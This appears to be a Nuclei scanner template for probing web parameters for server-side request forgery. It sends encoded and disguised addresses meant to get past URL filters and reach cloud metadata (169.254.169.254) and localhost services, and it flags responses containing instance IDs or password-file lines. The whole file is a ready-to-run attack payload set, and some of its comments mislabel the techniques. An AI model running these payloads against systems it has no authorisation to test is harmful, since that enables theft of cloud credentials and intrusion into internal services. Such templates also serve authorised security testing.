id: advanced-ssrf-waf-bypass

info:
  name: Advanced SSRF with Cloud Metadata & WAF Evasion
  author: thenawabx
  severity: critical
  description: Targeted at bypassing URL filters to access internal metadata or local services.
  tags: ssrf, advanced, cloud, bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url={{payload}}"
      - "{{BaseURL}}/?dest={{payload}}"
      - "{{BaseURL}}/?api={{payload}}"
      - "{{BaseURL}}/?u={{payload}}"

    payloads:
      payload:
        # 1. AWS/Cloud Metadata Bypass (Decimal IP)
        - "http://2852039166"  # Equivalent to 169.254.169.254
        # 2. Localhost Bypass (Hexadecimal IP)
        - "http://0x7f000001" # Equivalent to 127.0.0.1
        # 3. Enclosed Alphanumeric Bypass
        - "http://[::ffff:169.254.169.254]"
        # 4. Redirect Bypass using a custom Burp Collaborator or Interactor
        - "http://169.254.169.254.nip.io"
        # 5. Malformed URL Bypass
        - "http://127.0.0.1:80/"

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      # 1. Matches AWS Metadata response
      - type: word
        part: body
        words:
          - "latest/meta-data"
          - "instance-id"
          - "ami-id"
        condition: or

      # 2. Matches Localhost services (e.g., typical root/index page indicators)
      - type: word
        part: body
        words:
          - "root:x:0:0"
          - "localhost"
          - "Index of /"
        condition: or
